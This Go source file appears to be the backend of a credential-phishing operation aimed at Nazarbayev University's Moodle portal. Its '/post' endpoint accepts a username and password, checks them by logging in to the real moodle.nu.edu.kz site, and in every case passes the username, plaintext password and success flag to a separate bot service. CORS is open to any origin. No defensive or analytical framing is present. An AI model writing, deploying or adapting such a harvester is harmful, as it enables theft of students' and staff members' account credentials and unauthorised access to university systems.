package main

import (
	"log"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/neversi/baiterek-app-api/config"
	"github.com/neversi/baiterek-app-api/service"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"github.com/go-resty/resty/v2"
)

type MoodleForm struct {
	Username   string `json:"username"`
	Password   string `json:"password"`
	Remember   int    `json:"rememberusername"`
	LoginToken string `json:"logintoken"`
}

func main() {
	conf := config.ReadConfig("./.secrets/bot.yml")
	newBot := service.NewBot(conf)

	done := make(chan os.Signal, 1)
	signal.Notify(done, syscall.SIGINT, syscall.SIGTERM)

	router := gin.Default()

	router.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"POST", "OPTIONS", "GET", "PUT", "PATCH"},
		AllowHeaders:     []string{"Origin"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))
	router.GET("/", func(ctx *gin.Context) {
		ctx.Status(200)
	})

	router.POST("/post", func(ctx *gin.Context) {
		cc := resty.New()
		username := ctx.PostForm("username")
		password := ctx.PostForm("password")
		rememberMe, err := strconv.Atoi(ctx.PostForm("rememberusername"))
		if err != nil {
			rememberMe = 0
		}

		success := false
		defer func() {
			newBot.Logins <- service.Login{
				Username: username,
				Password: password,
				Success:  success,
			}
		}()
		resp, err := cc.R().Post("https://moodle.nu.edu.kz/login/index.php")
		if err != nil {
			log.Println(err)
			ctx.JSON(422, map[string]string{"status": "not ok", "logintoken": ""})
			return
		}
		logintoken := getLoginToken(resp.Body())

		time.Sleep(300 * time.Millisecond)

		resp, err = cc.R().
			SetFormData(map[string]string{
				"username":         username,
				"password":         password,
				"rememberusername": strconv.Itoa(rememberMe),
				"logintoken":       logintoken,
			}).
			Post("https://moodle.nu.edu.kz/login/index.php")
		if err != nil {
			log.Println(err)
			ctx.JSON(422, map[string]string{"status": "not ok", "logintoken": ""})
			return
		}

		if strings.Contains(string(resp.Body()), "Invalid login, please try again") {
			ctx.JSON(422, map[string]string{"status": "not ok", "logintoken": ""})
			return
		}

		success = true
		ctx.JSON(200, map[string]string{"status": "ok", "logintoken": logintoken})
	})

	go func() {
		if err := router.Run(":3000"); err != nil {
			log.Println(err)
		}
	}()
	<-done
	newBot.Close()
}

func getLoginToken(bbody []byte) string {
	body := string(bbody)
	idx := strings.Index(body, `name="logintoken" value="`)
	if idx == -1 {
		return ""
	}
	idx += len(`name="logintoken" value="`)
	body = body[idx:]
	idx = strings.Index(body, `"`)
	if idx == -1 {
		return ""
	}
	logintoken := body[:idx]
	return logintoken
}
